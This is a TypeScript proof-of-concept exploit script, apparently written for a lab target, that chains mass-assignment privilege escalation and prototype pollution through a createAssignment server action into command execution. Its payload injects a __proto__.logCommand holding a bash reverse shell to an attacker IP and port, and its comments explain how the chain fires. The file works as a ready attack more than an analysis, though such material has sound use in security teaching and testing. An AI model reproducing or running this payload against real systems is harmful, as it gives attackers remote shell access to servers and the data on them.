
import { createAssignment } from "./lib/actions/assignment";

/**
 * React2Shell PoC — Trigger RCE via Prototype Pollution
 * 
 * ATTACK CHAIN:
 *   1. Attacker registers as STUDENT → escalates to LECTURER via Mass Assignment
 *   2. As LECTURER, calls createAssignment with __proto__.logCommand payload
 *   3. deepMerge() pollutes Object.prototype.logCommand
 *   4. exec(logCommand) executes attacker's command → Reverse Shell
 * 
 * PREREQUISITES:
 *   - Must be authenticated as LECTURER (or ADMIN)
 *   - Server must be running (npm run dev)
 *   - Replace ATTACKER_IP with your C2 listener address
 * 
 * USAGE:
 *   npx tsx trigger_rce.ts
 * 
 * NOTE: This script simulates the Server Action call directly.
 *   In a real attack, this would be done via Burp Suite intercepting
 *   the HTTP POST to the Server Action endpoint.
 */

const ATTACKER_IP = "192.168.95.132";
const ATTACKER_PORT = "4444";

async function trigger() {
  console.log("[*] React2Shell PoC — Prototype Pollution → Command Template → RCE");
  console.log(`[*] Target: createAssignment Server Action`);
  console.log(`[*] C2: ${ATTACKER_IP}:${ATTACKER_PORT}`);
  console.log("");

  // Stage 1: Craft the payload
  // The __proto__.logCommand will be merged into Object.prototype via deepMerge()
  // Then assignment.ts reads: (baseMetadata as any).logCommand || "echo ..."
  // Since Object.prototype.logCommand is now set, it resolves to our command.
  const payload = {
    title: "Final Exam Prep",
    dueDate: "2026-06-30",
    dueTime: "23:59",
    module: "Advanced Mathematics",
    type: "Project",
    submissionsDone: 0,
    submissionsTotal: 128,
    status: "Published",
    "__proto__": {
      "logCommand": `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`
    }
  };

  console.log("[*] Payload:");
  console.log(JSON.stringify(payload, null, 2));
  console.log("");

  try {
    console.log("[*] Sending payload to createAssignment...");
    await createAssignment(payload);
    console.log("[+] Assignment created. Reverse shell should be connecting to C2...");
  } catch (e: any) {
    // Expected: Next.js runtime errors (revalidatePath outside request, auth() outside request)
    // But the exec() call fires BEFORE these errors, so RCE still triggers.
    console.log(`[!] Caught expected error: ${e.message}`);
    console.log("[!] This is normal — exec() fires asynchronously before the error.");
    console.log("[+] Check your nc listener for the incoming shell.");
  }
}

trigger();
